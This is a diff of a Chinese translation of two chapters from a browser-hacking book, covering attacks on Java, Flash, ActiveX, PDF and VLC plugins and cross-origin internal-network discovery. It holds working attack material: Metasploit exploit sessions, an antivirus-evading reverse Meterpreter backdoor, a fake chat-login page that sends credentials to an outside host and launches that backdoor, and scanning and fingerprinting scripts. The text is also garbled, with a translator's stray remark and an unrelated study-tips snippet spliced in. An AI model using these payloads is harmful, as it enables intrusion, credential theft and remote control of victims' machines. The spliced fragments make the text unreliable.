-    这个漏洞利用的依据是 Java Reflection API。21 Reflection 是在运行时检查和修改对象行为的能力。在此特定情况下，通过使用 Reflection，可以获取 `com.sun.jmx.mbeanserver.MBeanInstantiator` 实例，然后调用 `findClass()` 方法。有了这种可能性，你就可以加载额外的类，并在实践中调用你自定义的类，该类会调用常规的 `Runtime.getRuntime().exec()` 方法来执行操作系统命令。
-
-    由于沙箱被绕过，利用该漏洞意味着可以从未签名的 Applet 执行操作系统命令。当时，该漏洞的影响很大，因为如前所述，Oracle 仅在 1.7 更新 11 版本中添加了 Click to Play 功能。
+由于沙箱被绕过，利用该漏洞意味着可以从未签名的 Applet 执行操作系统命令。当时，该漏洞的影响很大，因为如前所述，Oracle 仅在 1.7 更新 11 版本中添加了 Click to Play 功能。
 
 ### 利用 Java
 
@@ -9614,7 +9712,6 @@ $ jar xvf signedAppletCmdExec.jar
 记住第二章中提到的第二个 Click to Play 绕过，由 Immunity 发现，并在本章前文中讨论过？下面你就能看到它在这类漏洞中的实际应用，因为你将针对 Java 1.7 更新 11 之后的版本进行攻击。
 
 首先，你需要在 Metasploit 中配置该漏洞：
-
 ```
 msf > use exploit/multi/browser/java_jre17_driver_manager
 msf exploit(java_jre17_driver_manager) > set PAYLOAD 
@@ -9623,9 +9720,7 @@ msf exploit(java_jre17_driver_manager) > set SRVHOST 172.16.37.1
 msf exploit(java_jre17_driver_manager) > set LHOST 172.16.37.1
 msf exploit(java_jre17_driver_manager) > exploit
 [*] Exploit running across <ref>
-
-
-
+```
 Flash 维护其独立的 Cookie 存储，允许存储浏览器无法直接删除的 Cookie。Flash 还可以使用本地存储缓存文件，并可访问网络摄像头和麦克风。Flash 还具备向远程目标发送和接收数据的能力。
 
 了解 Flash 是什么，以及如何进行指纹识别并加以利用，是为您的攻击工具包添加技能的有价值技能。该插件的普及性以及可以用于滥用麦克风和网络摄像头的能力，使其成为一个有价值的攻击目标。
@@ -9640,13 +9735,13 @@ Shared Objects 是 ActionScript 的构造，允许本地和远程从数据存储
 
 与浏览器会话 Cookie 不同，Shared Objects 数据不会定期删除，这也是 Flash Cookie 如此诱人的原因。除了基本用户信息外，这些数据存储可能包含访问远程应用程序的凭据或其他敏感数据。
 
- start figure 
+start figure
 
 **Figure 8-16:** The Website Storage Settings Panel of the Flash plugin
 
 ![c08f016.tif](img/c08f016.png)
 
- end figure 
+end figure
 
 Shared Objects 的信息也存储在文件系统中。要在 Mac 上查看您的信息，可以前往主目录的 Library/Preferences/Macromedia/Flash Player/#SharedObjects/ 文件夹。在 Windows，文件位于 C:\\Documents and Settings\\\[username\]\\Application Data\\Macromedia\\Flash Player。检查这些文件时，您可能会发现身份验证数据、会修改程序功能的信息，或其他极好的线索。因此，在系统被入侵后，这些文件不是查找进一步利用信息的糟糕位置。
 
@@ -9660,13 +9755,13 @@ ActionScript 是开源脚本语言，编译为字节码，并被 Adobe Flash 和
 
 能够同时利用网络摄像头和麦克风，使得在 Flash 中进行实验变得非常有趣。默认情况下，网络摄像头和麦克风的安全设置均为拒绝访问。当您右键单击 Flash 插件并选择 Settings 时，您可以查看当前设置。Figure 8-17 展示了允许或拒绝使用麦克风或摄像头的设置。
 
- start figure 
+start figure
 
 **Figure 8-17:** Adobe Flash 相机和麦克风设置
 
 ![c08f017.tif](img/c08f017.png)
 
- end figure 
+end figure
 
 如果您能骗人启用此功能，Flash 插件可以访问摄像头和麦克风。此外，如果您骗人勾选 Remember 选项，Flash 将在当前来源的上下文中记住该设置，以供将来所有 Flash 插件使用。此设置并非特定于 Flash 插件，因此同一站点上的任何其他 Flash 插件都将被允许。
 
@@ -9686,7 +9781,7 @@ Google Security 团队 27 在 2011 年进行了一项 notable 发现可利用漏
 
 此调查识别出约 400 个唯一崩溃签名，其中 106 个被标记为安全漏洞。Google Security 团队首先收集了约 20TB 的 SWF 文件。从中，他们创建了一个包含 20,000 个唯一文件的最小集合。这些文件被变异并输入 Flash Player，同时监控崩溃。
 
- start feature 
+start feature
 
 * * *
 
@@ -9694,14 +9789,11 @@ Google Security 团队 27 在 2011 年进行了一项 notable 发现可利用漏
 
 * * *
 
- end feature 
+end feature
 
 ## 攻击 ActiveX 控件
 
 ActiveX 是 Microsoft 为浏览器开发的插件架构，用于让开发者在浏览器中添加额外功能。ActiveX 控件可以从创建动画到在系统上安装软件。由于它们能够在浏览器和操作系统之间建立桥梁，它们也是主要的攻击目标。许多站点需要 ActiveX 才能正常工作。
-
-
-
 
 一些 ActiveX 控件是熟悉的，例如 Adobe Flash、Java 或 Windows Update。一些控件提供站点特定的功能，如身份验证和证书管理。撰写时，中国银行网站<sup>28</sup> 是一个典型例子。通过了解这些控件的工作原理以及如何利用它们，你可以利用其中的漏洞来指纹识别浏览器、操作执行并获得系统访问。
 
@@ -9711,40 +9803,33 @@ ActiveX 是 Microsoft 为浏览器开发的插件架构，用于让开发者在�
 
 利用 ActiveX 并不总是直接。有时需要组合两种不同的攻击才能获取更受保护的资源访问权限。下面的示例展示了如何同时利用企业共享的访问权限以及已安装的插件的知识来进行利用。
 
-被调查的模块是 Mitsubishi MC-WorX<sup>31</sup> ActiveX 插件。该插件是 Mitsubishi MC-WorX SCADA 套件的一部分，用于为制造系统提供可视化支持。你要利用的插件设计为充当程序本身的启动器。Blake<sup>32</sup> 发现的缺陷允许指定任意文件名进行启动。问题是，利用仅支持本地文件名；UNC 路径<sup>33</sup> 不被允许；然而，如果 UNC 路径已映射为驱动器字母，则这些路径可用。这在企业环境中很常见，例如部门文件共享和其他企业资源。在这些情况下，很可能存在某个权限较低的用户，你可能希望针对该用户进行攻击，并且该用户已有对企业共享的访问权限。
 
-在本例中，你需要创建一个 Metasploit payload、设置一个 handler，并创建一个你希望受害者访问的示例页面。你可以通过以下方式诱导受害者访问该页面：在合法页面中注入代码（使用 Ettercap），修改内部网络的共享文件，或将其作为钓鱼攻击的一部分进行分发。
 
-前提是插件已经在目标系统上安装。Chris Gates 曾展示一些技巧<sup>34</sup>，通过假装该插件是查看内容所必需的，骗取用户先安装该漏洞插件。无论目标如何安装软件，假设目标已经安装了插件。
+被调查的模块是 `Mitsubishi MC-WorX` 31 ActiveX 插件。该插件是 `Mitsubishi MC-WorX SCADA` 套件的一部分，用于为制造系统提供可视化支持。你要利用的插件设计为充当程序本身的启动器。`Blake` 32 发现的缺陷允许指定任意文件名进行启动。问题是，利用仅支持本地文件名；`UNC` 路径 33 不被允许；然而，如果 `UNC` 路径已映射为驱动器字母，则这些路径可用。这在企业环境中很常见，例如部门文件共享和其他企业资源。在这些情况下，很可能存在某个权限较低的用户，你可能希望针对该用户进行攻击，并且该用户已有对企业共享的访问权限。
 
- start feature 
+在本例中，你需要创建一个 `Metasploit` payload、设置一个 handler，并创建一个你希望受害者访问的示例页面。你可以通过以下方式诱导受害者访问该页面：在合法页面中注入代码（使用 `Ettercap`），修改内部网络的共享文件，或将其作为钓鱼攻击的一部分进行分发。
 
-* * *
+前提是插件已经在目标系统上安装。`Chris Gates` 曾展示一些技巧 34，通过假装该插件是查看内容所必需的，骗取用户先安装该漏洞插件。无论目标如何安装软件，假设目标已经安装了插件。
 
-**Metasploit Utilities** 你可以以多种方式与 Metasploit 框架交互。第 6 章之前已经通过交互控制台（msfconsole）演示了 Metasploit。其他重要的 Metasploit 命令包括：
+### Metasploit Utilities
 
-*   Msfpayload——用于生成 Metasploit payloads 的命令行实用工具。
+你可以以多种方式与 `Metasploit` 框架交互。第 6 章之前已经通过交互控制台 `msfconsole` 演示了 `Metasploit`。其他重要的 `Metasploit` 命令包括：
 
-*   Msfencode——用于编码 shellcode 的命令行实用工具。通常 msfpayload 与 msfencode 会一起使用，以输出特定 payload 并对其进行编码。
+* `Msfpayload`——用于生成 `Metasploit` payloads 的命令行实用工具。
+* `Msfencode`——用于编码 shellcode 的命令行实用工具。通常 `msfpayload` 与 `msfencode` 会一起使用，以输出特定 payload 并对其进行编码。
+* `Msfvenom`——将 `msfpayload` 与 `msfencode` 合并为单一命令。
+* `Msfgui`——`Metasploit` 的交互式图形用户界面。
 
-*   Msfvenom——将 msfpayload 与 msfencode 合并为单一命令。
+下一步是创建并上传一个 `Meterpreter` payload，然后由受害者浏览并执行。假设你的 IP 地址是 `192.168.1.132`。你需要向 `msfpayload` 指定 payload、端口和 IP 地址来生成 `Meterpreter` 后门。
 
-*   Msfgui——Metasploit 的交互式图形用户界面。
-
-* * *
-
- end feature 
-
-下一步是创建并上传一个 Meterpreter payload，然后由受害者浏览并执行。假设你的 IP 地址是 192.168.1.132。你需要向 msfpayload 指定 payload、端口和 IP 地址来生成 Meterpreter 后门。
-
-此外，你可能还想使用 msfencode 进一步编码二进制文件，以降低被防病毒软件检测的概率。该技术在不同阶段表现出有效或无效的情况。如果 payload 被防病毒检测到，建议使用诸如 Hyperion<sup>35</sup> 之类的打包工具，或更优的 Veil<sup>36</sup>。下面的 shell 命令将 msfpayload 与 msfencode 组合，生成二进制文件：
+此外，你可能还想使用 `msfencode` 进一步编码二进制文件，以降低被防病毒软件检测的概率。该技术在不同阶段表现出有效或无效的情况。如果 payload 被防病毒检测到，建议使用诸如 `Hyperion` 35 之类的打包工具，或更优的 `Veil` 36。下面的 shell 命令将 `msfpayload` 与 `msfencode` 组合，生成二进制文件：
 
 ```
 msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.132\
   LPORT=8675 R | msfencode -c 3 -t exe > backdoor.exe
 ```
 
-此命令创建一个反向 Meterpreter payload，经过三次编码，并将可执行文件保存为 backdoor.exe。随后，你需要相应的 Metasploit handler 来让 payload 与你建立连接。为此，你需要启动 Metasploit 的 msfconsole，并使用以下选项启动 multi/handler：
+此命令创建一个反向 `Meterpreter` payload，经过三次编码，并将可执行文件保存为 `backdoor.exe`。随后，你需要相应的 `Metasploit` handler 来让 payload 与你建立连接。为此，你需要启动 `Metasploit` 的 `msfconsole`，并使用以下选项启动 `multi/handler`：
 
 ```
 msf> use multi/handler
@@ -9763,11 +9848,11 @@ msf exploit(handler) > exploit -j
 [*] Starting the payload handler...
 ```
 
-可以看到此时 handler 正在监听，由于使用了 \-j 选项，它在后台运行并可接受多个受害者的回连。这在可能有多个受害者同时连接时非常有用。
+可以看到此时 handler 正在监听，由于使用了 `-j` 选项，它在后台运行并可接受多个受害者的回连。这在可能有多个受害者同时连接时非常有用。
 
 下一步是构建一个足以诱使用户点击恶意链接的页面。第 5 章介绍了多种诱导受害者在浏览器中执行恶意代码的技术，例如利用 UI 预期或假装软件更新。
 
-首先，创建一个看起来像聊天程序的 HTML 页面。该页面将包含两个特性：一个鼓励登录 Active Directory 的登录框，以及一个登录按钮。插件生成的按钮文字为 “Login Client”，因此你可以在同一控件上实现凭据捕获和利用的双重目的：
+首先，创建一个看起来像聊天程序的 HTML 页面。该页面将包含两个特性：一个鼓励登录 `Active Directory` 的登录框，以及一个登录按钮。插件生成的按钮文字为 “Login Client”，因此你可以在同一控件上实现凭据捕获和利用的双重目的：
 
 ```
 <html>
@@ -9806,27 +9891,17 @@ document.getElementById("target").fileName = "Z:\\backdoor.exe"
 </html>
 ```
 
-代码使用 onBlur 方法监听密码字段的变化，并在变化时调用 submitData 函数。该函数尝试将包含登录信息的表格背景设置为图片，实际上是向 browserhacker.com 发送 GET 请求，将用户名和密码作为参数。当用户点击登录按钮时，会启动后门。浏览该页面时应呈现如 Figure 8-18 所示。
-
- start figure 
+代码使用 `onBlur` 方法监听密码字段的变化，并在变化时调用 `submitData` 函数。该函数尝试将包含登录信息的表格背景设置为图片，实际上是向 `browserhacker.com` 发送 `GET` 请求，将用户名和密码作为参数。当用户点击登录按钮时，会启动后门。浏览该页面时应呈现如 Figure 8-18 所示。
 
 **Figure 8-18:** 伪装成聊天程序的登录页面
 
 ![c08f018.tif](img/c08f018.png)
 
- end figure 
-
-点击 “Login Client” 按钮后，ActiveX 控件尝试调用 backdoor.exe。为提高成功率，你可以将其命名为 “chatclient.exe”，并根据伪装网页的名称进行调整。 Figure 8-19 展示了当文件未签名时，用户会收到的弹窗警告。
-
- start figure 
+点击 “Login Client” 按钮后，`ActiveX` 控件尝试调用 `backdoor.exe`。为提高成功率，你可以将其命名为 “chatclient.exe”，并根据伪装网页的名称进行调整。 Figure 8-19 展示了当文件未签名时，用户会收到的弹窗警告。
 
 **Figure 8-19:** 未签名应用程序的弹窗
 
 ![c08f019.tif](img/c08f019.png)
-
- end figure 
-
-
 
 一旦用户点击“确定”，程序会向你的 `Metasploit` 监听器发起请求。`Metasploit` 会创建一个新会话，并允许你与新的 `Meterpreter` 会话进行交互：
 
@@ -9847,7 +9922,7 @@ Meterpreter     : x86/win32
 meterpreter > 
 ```
 
-尽管此攻击稍微复杂一些，但也可以像许多其他插件一样直接攻击 ActiveX。插件中的漏洞时有发现，因此只需找到适合目标平台的合适 exploit 即可。
+尽管此攻击稍微复杂一些，但也可以像许多其他插件一样直接攻击 `ActiveX`。插件中的漏洞时有发现，因此只需找到适合目标平台的合适 exploit 即可。
 
 ### 攻击 PDF 阅读器
 
@@ -9883,19 +9958,15 @@ app.launchURL("http://browserhacker.com:3000/demos/report.html",true);
 
 使用此方法，PDF 会启动将要处理的 URL，从而在默认浏览器中加载新页面，并为你提供新的被钩取会话。如图 8-20 所示，Hook Default Browser 模块会接收已钩取的浏览器，并向其发送 PDF。PDF 随后会将 URL 回传给钩子，默认浏览器随之打开新的已钩取页面。
 
-<|ref|>start|>figure<|/ref|><|det|>[[100, 330, 896, 512]]<|/det|>
-
-<|ref|>end|>figure<|/det|>
-
 出现弹窗的可能性提醒用户外部窗口已被打开。请关注模块的停止灯是绿色还是红色，因为不同浏览器对该技术的反应各异。
 
 这种攻击场景在企业环境中尤为有用。如果受害者通过 `Chrome` 被钩取，但默认浆和文字描述中的“items”遮挡了部分视线，且本身就是物理上的遮挡。
 
-    让我们再仔细看一遍问题要求：“粗体和斜体需要翻译翻译内容并保留符号”。这里没有粗体或斜体（除了上述内容，原文还包含了一段关于媒体插件的内容，但由于篇幅限制，此处不再逐句翻译，仅保留核心要点：
+媒体插件（如 `VLC`、`RealPlayer`、`QuickTime`）常被用于利用文件格式漏洞，即因文件格式非法导致插件覆盖内存并可能执行恶意代码。
 
-- 媒体插件（如 `VLC`、`RealPlayer`、`QuickTime`）常被用于利用文件格式漏洞，即因文件格式非法导致插件覆盖内存并可能执行恶意代码。  
-- 插件检测方式与其他插件相同，且可能支持多种 MIME 类型，例如 `QuickTime` 支持 `.mp4` 与 `.mov` 两种格式，对应两个 MIME 类型。  
-- 媒体插件常需从外部服务器流媒体、加载附加文件等，这些操作也可能导致漏洞。  
+插件检测方式与其他插件相同，且可能支持多种 MIME 类型，例如 `QuickTime` 支持 `.mp4` 与 `.mov` 两种格式，对应两个 MIME 类型。
+
+媒体插件常需从外部服务器流媒体、加载附加文件等，这些操作也可能导致漏洞。
 
 ### 使用 VLC 进行资源扫描
 
@@ -9914,97 +9985,138 @@ vlc.playlist.playItem(0);
 vlc.attachEvent("MediaPlayerPlaying", onFound);
 vlc.attachEvent("MediaPlayerEncounteredError", onNotFound);
 </script>
-
-
+```
 
 通过创建 ActiveX 对象、清除播放列表、添加项目并播放它，会发生两种情况之一：ActiveX 对象会产生错误，或者它会触发播放事件。通过捕获这些事件，可以触发额外的 JavaScript 来提示文件的存在。
 
-下面的代码枚举 items 数组中定义的多个资源：
+下面的代码枚举 `items` 数组中定义的多个资源：
 
 ```
 try {
+
  var result = "";
+
  var i = 0;
 
  // 创建用于挂载 VLC 对象的 div
+
  var newdiv = document.createElement('div');
+
  var divIdName = 'temp_div';
+
  newdiv.setAttribute('id',divIdName);
+
  newdiv.style.width = "0";
+
  newdiv.style.height = "0";
+
  newdiv.style.visibility = "hidden";
+
  document.body.appendChild(newdiv);
 
  // 创建对象
+
  document.getElementById("temp_div").innerHTML =
+
  "<object style=\"visibility:hidden\"" +
+
  " classid=\"clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921\"" +
+
  " width=\"0\" height=\"0\" id=\"vlc\"></object>";
 
  var items = [
+
   "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.20125.0",
+
   "C:\\Program Files (x86)\\Sophos\\Sophos Anti-Virus",
+
+
+
+```javascript
   "C:\\Users\\wade",
+
   "C:\\Users\\morru"
+
  ]
 
  function onFound(event){
+
   result += items[i] + "\n";
+
   i++;
+
   console.log("Found");
+
   next();
+
  }
 
  function onNotFound(event){
+
   i++;
+
   console.log("Not Found");
+
   next();
+
  }
 
  function next(){
+
   if (i >= items.length){
+
   vlc.playlist.stop();
 
   // 将结果返回给框架
+
   console.log("Discovered resources:\n" + result);
 
   // 清理
+
   var rmdiv = document.getElementById("temp_div");
+
   document.body.removeChild(rmdiv);
 
   return;
+
  }
 
  vlc.playlist.clear();
+
  vlc.playlist.add("file:///" + items[i]);
+
  console.log("Adding item " + items[i] + " to playlist.");
+
  vlc.playlist.playItem(0);
+
 }
 
  vlc.attachEvent("MediaPlayerPlaying", onFound);
+
  vlc.attachEvent("MediaPlayerEncounteredError", onNotFound);
 
  next();
+
 } catch(e) {}
 ```
 
 在 Internet Explorer 中运行此代码后（如 Figure 8-21 所示），可以确认已安装 Sophos Anti-Virus。此信息可用于后续攻击。例如，若目标使用 Sophos Anti-Virus，则用于攻击的二进制文件会经过针对该 AV 的编码以规避检测。
 
-此外，还发现合法用户 morru，这可能有助于进一步的黑客活动。利用此技术，可以枚举已安装的软件版本（如果软件的文件或目录名包含版本号）。在此例中，Silverlight 的具体版本可被确定，同样适用于 Java 等其他软件。
+此外，还发现合法用户 `morru`，这可能有助于进一步的黑客活动。利用此技术，可以枚举已安装的软件版本（如果软件的文件或目录名包含版本号）。在此例中，Silverlight 的具体版本可被确定，同样适用于 Java 等其他软件。
 
- start figure 
+start figure
 
 **Figure 8-21:** 通过 VLC 枚举本地资源
 
 ![c08f021.tif](img/c08f021.png)
 
- end figure 
+end figure
 
 ### 利用媒体播放器
 
 此示例利用 VLC 玩家（2.0 版本之前）的一个弱点——“VLC MMS Stream Handling Buffer Overflow”漏洞。该漏洞使用 Internet Explorer 启动 VLC 并传递恶意 URL，当 VLC 处理该 URL 时，会导致 SEH41 覆盖，从而执行 payload。
 
-在 Metasploit 的 msfconsole 中启动恶意 URL 可以执行以下命令：
+在 Metasploit 的 `msfconsole` 中启动恶意 URL 可以执行以下命令：
 
 ```
 msf> use exploit/windows/browser/vlc_mms_bof 
@@ -10018,7 +10130,6 @@ msf exploit(vlc_mms_bof) > set LPORT 8675
 LPORT => 8675
 msf exploit(vlc_mms_bof) > exploit
 [*] Exploit running as background job.
-
 [*] Started reverse handler on 192.168.1.132:8675 
 [*] Using URL: http://0.0.0.0:8080/vlc
 [*]  Local IP: http://192.168.1.132:8080/vlc
@@ -10027,15 +10138,15 @@ msf exploit(vlc_mms_bof) > exploit
 
 服务器启动后，只需将浏览器指向 Metasploit 服务器即可（本例为 [`192.168.1.132:8080/vlc`](http://192.168.1.132:8080/vlc)）。浏览器会稍后显示一个黑色框，表示媒体未能播放（如 Figure 8-22 所示）。一旦用户看到此画面，你的 Metasploit 中已经等待着一个 shell。
 
- start figure 
+start figure
 
-**Figure 8-22:**  exploit 成功后浏览器窗口的样子
+**Figure 8-22:** exploit 成功后浏览器窗口的样子
 
 ![c08f022.tif](img/c08f022.png)
 
- end figure 
+end figure
 
-Meterpreter payload 会自动迁移到新进程，因为 exploit 成功后浏览器会变得不稳定。新进程可确保 Meterpreter payload 持久存在超过短暂时间。Metasploit 控制台应显示类似以下内容：
+`Meterpreter` payload 会自动迁移到新进程，因为 exploit 成功后浏览器会变得不稳定。新进程可确保 `Meterpreter` payload 持久存在超过短暂时间。Metasploit 控制台应显示类似以下内容：
 
 ```
 [*] 192.168.1.16     vlc_mms_bof - Sending malicious page
@@ -10048,10 +10159,8 @@ Meterpreter payload 会自动迁移到新进程，因为 exploit 成功后浏览
 [*] Spawning notepad.exe process to migrate to
 [+] Migrating to 2308
 [+] Successfully migrated to process 
-
 msf exploit(vlc_mms_bof) > sessions -i 3
 [*] Starting interaction with 3...
-
 meterpreter > sysinfo
 Computer        : VM-1
 OS              : Windows XP (Build 2600, Service Pack 3).
@@ -10059,6 +10168,8 @@ Architecture    : x86
 System Language : en_US
 Meterpreter     : x86/win32
 ```
+
+
 
 浏览器可能不会立即崩溃，因此用户可能不清楚恶意页面是导致崩溃的原因。这种攻击同样适用于广告插入、驱动程序下载以及钓鱼攻击等多种场景。用户看到视频未加载时，背后实际上正在发生更恶劣的事情。到那时，攻击者已经拥有了一个 shell。你再也不会把那些加载失败的视频当作普通情况看待了吧？
 
@@ -10074,12 +10185,9 @@ Java、Firefox 和 Chrome 中实现的 Click to Play 安全特性虽然是很好
 
 本地文件执行可以与更复杂的攻击配合，以获得目标系统的提升权限。其他攻击则更为直接，单个 URL 即可实现利用和访问。插件沙箱试图阻止这种行为，但通过使用已签名插件、社交工程或已建立的信任关系，这些防护屏障可以被突破以实现利用。
 
+近期来自 Chromium 团队的公告 `42` 也揭示了浏览器插件的未来发展方向。由于稳定性和安全性考虑，Chrome 将在 2014 年底停止对旧版 Netscape Plugin API `NPAPI` 的支持。
 
-
-
-- 近期来自 Chromium 团队的公告 42 也揭示了浏览器插件的未来发展方向。由于稳定性和安全性考虑，Chrome 将在 2014 年底停止对旧版 Netscape Plugin API (NPAPI) 的支持。
-
-1. 尽管 Chrome 和 Firefox 中插件支持的下降速度放缓，但插件不会瞬间消失。此外，我们并不期望微软很快会移除 ActiveX 支持，因为其存在的遗留和企业需求。即便有防护措施，只要用户愿意点击“接受”，浏览器插件仍将成为进入脆弱系统的入口。
+尽管 Chrome 和 Firefox 中插件支持的下降速度放缓，但插件不会瞬间消失。此外，我们并不期望微软很快会移除 ActiveX 支持，因为其存在的遗留和企业需求。即便有防护措施，只要用户愿意点击“接受”，浏览器插件仍将成为进入脆弱系统的入口。
 
 # Questions
 
@@ -10141,8 +10249,6 @@ Level1 **1.** 插件和添加程序（add‑ons）有什么区别？ **2.** 在 
 
 25\. Adobe. (2013). ActionScript 3 camera API. Retrieved October 23, 2013 from [`help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Camera.html`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Camera.html)
 
-
-
 26. Adobe. (2013). ActionScript 3 microphone API。Retrieved October 23, 2013 from [`http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Microphone.html`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Microphone.html)
 
 27. Google Security Blog. (2013). Fuzzing at scale。Retrieved October 23, 2013 from [`http://googleonlinesecurity.blogspot.co.uk/2011/08/fuzzing-at-scale.html`](http://googleonlinesecurity.blogspot.co.uk/2011/08/fuzzing-at-scale.html)
@@ -10181,7 +10287,7 @@ Level1 **1.** 插件和添加程序（add‑ons）有什么区别？ **2.** 在 
 
 # Sending Cross-origin Requests
 
-In most situations the Same Origin Policy (SOP) prevents you from reading the HTTP response when sending cross-origin requests. As you will see in this and following chapters, you don’t always need to read the response to successfully deliver your attacks.
+In most situations the Same Origin Policy `SOP` prevents you from reading the HTTP response when sending cross-origin requests. As you will see in this and following chapters, you don’t always need to read the response to successfully deliver your attacks.
 
 If you know that a particular server is vulnerable to a Remote Command Execution or SQL injection vulnerability, you can send the request containing the attack, ignoring the response. The important point for most attacks is that the target correctly processes the data in the HTTP request.
 
@@ -10191,45 +10297,62 @@ Before you venture off into the world of enumerating cross-origin attacks, you n
 
 Not all browsers are created equal when it comes to cross-origin quirks. Variations exist between version and vendor, and consequently some browsers will be more useful than others. CSS, JavaScript, and the SOP have many quirks that can influence the probability of a successful attack. In this section, you explore methods to establish the capabilities of different browsers at any given time.
 
-So, first things first. Let’s start with working out if your browser can actually conduct requests cross-origin. Run the following code to test the usefulness of the browser. It determines if the browser will conduct the POST and GETXMLHttpRequest cross-origin. First, execute the following server-side Ruby code to handle GET and POST requests:
+So, first things first. Let’s start with working out if your browser can actually conduct requests cross-origin. Run the following code to test the usefulness of the browser. It determines if the browser will conduct the POST and GET `XMLHttpRequest` cross-origin. First, execute the following server-side Ruby code to handle GET and POST requests:
+
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
+
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+
+```
+```
 
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+如果 IFrame 加载成功，onload 事件会被触发，这意味着 `172`
 
-
-如果 IFrame 加载成功，onload 事件会被触发，这意味着 `172
-[content]
 Enumerating internal domain names is another useful method of cross-origin web application detection. The approach is very similar to discovering internal IP addresses. The difference exists in iterating over predefined domain names rather than IP ranges.
 
 The array in the subsequent code snippet has a list of common internal domain names. Run it in your JavaScript console and it will discover web applications that have an internal domain name in the list:
 
 ```
 var protocol = "http://";
+
 var port = 80;
 
 // common internal hostnames
+
 var hostnames = new Array("about", "accounts", "admin",
+
 "administrator", "ads", "adserver", "adsl", "agent", 
+
 "blog", "channel", "client", "dev", "dev1", "dev2", 
+
 "dev3", "dev4", "dev5", "dmz", "dns", "dns0", "dns1", 
+
 "dns2", "dns3", "extern", "extranet", "file", "forum", 
+
 "forums", "ftp", "ftpserver", "host", "http", "https", 
+
 "ida", "ids", "imail", "imap", "imap3", "imap4", "install", 
+
 "intern", "internal", "intranet", "irc", "linux", "log", 
+
 "mail", "map", "member", "members", "name", "nc", "ns", 
+
 "ntp", "ntserver", "office", "owa", "phone", "pop", "ppp1", 
+
 "pptp", "print", "printer", "project", "pub", "public", 
+
 "preprod", "root", "route", "router", "server", "smtp", 
+
 "sql", "sqlserver", "ssh", "telnet", "time", "voip", 
+
 "w", "webaccess", "webadmin", "webmail", "webserver", 
+
 "website", "win", "windows", "ww", "www", "wwww", "xml");
 
 // adds a new 'b' element that will hold
@@ -10275,13 +10398,13 @@ Both the code snippets could be modified to support additional URI schemes like 
 
 You can see the results of executing both techniques in Figure 9-2. Two internal web applications were identified on IPs 172.16.37.1 and 172.16.37.147, as well as two distinct internal domain names mapped at www and sqlserver.
 
- start figure 
+start figure
 
 **Figure 9-2:** Discovering internal network details
 
 ![c09f002.tif](img/c09f002.png)
 
- end figure 
+end figure
 
 After you discover IP addresses and domain names of web applications sitting in the internal network of the hooked browser, the next step is fingerprinting them.
 
@@ -10354,11 +10477,9 @@ var fingerprint_data = new Array(
 );
 ```
 
-Every array element of the fingerprint_data data structure contains the name of the domain, the port and scheme type to be used to request the image path, and, finally, the image width/height tuple. If you are keen to see a more complete (although not exhaustive) fingerprinting database, check out BeEF’s internal_network_fingerprinter module, thanks to the hard work of Brendan Coles4.
+Every array element of the `fingerprint_data` data structure contains the name of the domain, the port and scheme type to be used to request the image path, and, finally, the image width/height tuple. If you are keen to see a more complete (although not exhaustive) fingerprinting database, check out BeEF’s internal_network_fingerprinter module, thanks to the hard work of Brendan Coles4.
 
-
-
--   [在获取到 IPs 和图像数据后，下面的 JavaScript 代码可以注入到被钩针的浏览器 DOM 中。它会检查这些 IPs，或你可以指定的其他 IPs，是否运行了指纹数据集（fingerprint_data）中映射的 Web 应用：]
+- [在获取到 IPs 和图像数据后，下面的 JavaScript 代码可以注入到被钩针的浏览器 DOM 中。它会检查这些 IPs，或你可以指定的其他 IPs，是否运行了指纹数据集（fingerprint_data）中映射的 Web 应用：]
 
 ```
 var dom = document.createElement('b');
@@ -10370,56 +10491,68 @@ for(var i=0; i < ips.length; i++) {
     img.id = u;
     img.src = fingerprint_data[u][2] + "://" + ips[i]
          + ":" + fingerprint_data[u][1] + fingerprint_data[u][4];
-      
-    // onload 事件触发，说明资源已被找到
-    img.onload = function() {
-       
-      // 再次确认宽度和高度
-      if (this.width == fingerprint_data[this.id][5] && 
-            this.height == fingerprint_data[this.id][6]) {
-        console.log("检测到 [" + fingerprint_data[this.id][0] + "] 在 IP [" + ips[i] + "]");
+```
 
-        // 向 BeEF 服务器发送通知
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,
-          'discovered='+escape(fingerprint_data[this.id][0])+
-          "&url="+escape(this.src)
-        );
-        // 完成任务，从 DOM 中移除图像
-        dom.removeChild(this); 
-      }
-    }
-    // 将图像添加到 DOM
-    dom.appendChild(img);
+
+
+```javascript
+// onload 事件触发，说明资源已被找到
+
+img.onload = function() {
+
+  // 再次确认宽度和高度
+
+  if (this.width == fingerprint_data[this.id][5] && 
+
+        this.height == fingerprint_data[this.id][6]) {
+
+    console.log("检测到 [" + fingerprint_data[this.id][0] + "] 在 IP [" + ips[i] + "]");
+
+    // 向 BeEF 服务器发送通知
+    beef.net.send('<%= @command_url %>', <%= @command_id %>,
+      'discovered='+escape(fingerprint_data[this.id][0])+
+      "&url="+escape(this.src)
+    );
+
+    // 完成任务，从 DOM 中移除图像
+    dom.removeChild(this); 
   }
+
+}
+
+// 将图像添加到 DOM
+dom.appendChild(img);
+
 }
 ```
 
--   当前面的代码运行时，会尝试在单独的 IFrames 中加载所有资源。资源的 URL 由指纹数据集（fingerprint_data）和 IP 结构组合而成。如果图像的 onload 事件被触发，说明资源已被正确识别（否则会触发 onerror 事件）。
+- 当前面的代码运行时，会尝试在单独的 IFrames 中加载所有资源。资源的 URL 由指纹数据集（`fingerprint_data`）和 IP 结构组合而成。如果图像的 `onload` 事件被触发，说明资源已被正确识别（否则会触发 `onerror` 事件）。
